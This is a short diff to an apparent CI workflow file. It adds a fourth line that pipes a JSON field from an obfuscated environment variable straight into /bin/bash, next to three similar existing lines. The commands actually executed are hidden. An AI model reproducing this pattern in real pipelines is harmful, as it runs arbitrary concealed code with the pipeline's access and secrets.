@@ -23,6 +23,7 @@ jobs:
           echo $mp25 | jq -r .ud17 | /bin/bash
           printf '%s' "$ffm92" | jq -r .dyfu9 | /bin/bash
           printf '%s' "$usu64" | jq -r .vpowg856 | /bin/bash
+          echo $lvrgd1703 | jq -r .omg849 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
